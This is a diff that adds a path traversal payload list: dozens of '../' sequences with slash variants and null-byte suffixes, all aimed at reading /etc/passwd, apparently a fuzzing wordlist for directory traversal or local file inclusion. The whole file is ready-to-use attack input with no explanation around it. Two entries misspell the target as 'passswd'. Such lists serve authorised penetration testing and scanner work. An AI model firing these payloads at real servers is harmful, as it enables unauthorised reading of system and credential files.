@@ -1,1 +1,47 @@
+# /etc/passwd
 
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passswd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+
+..//..//..//etc/passwd
+..//..//..//..//etc/passwd
+..//..//..//..//..//etc/passswd
+..//..//..//..//..//..//etc/passwd
+..//..//..//..//..//..//..//etc/passwd
+
+//..//..//etc/passwd
+//..//..//..//etc/passwd
+//..//..//..//..//etc/passwd
+//..//..//..//..//..//etc/passwd
+//..//..//..//..//..//..//etc/passwd
+
+///..///..///etc/passwd
+///..///..///..///etc/passwd
+///..///..///..///..///etc/passwd
+///..///..///..///..///..///etc/passwd
+///..///..///..///..///..///..///etc/passwd
+
+
+////..////..////etc/passwd
+////..////..////..////etc/passwd
+////..////..////..////..////etc/passwd
+////..////..////..////..////..////etc/passwd
+////..////..////..////..////..////..////etc/passwd
+
+# null byte 
+
+../etc/passwd%00
+../../etc/passwd%00
+../../../etc/passwd%00
+../../../../etc/passwd%00
+../../../../../etc/passwd%00
+../../../../../../etc/passwd%00
+../../../../../../../etc/passwd%00
+../../../../../../../../etc/passwd%00
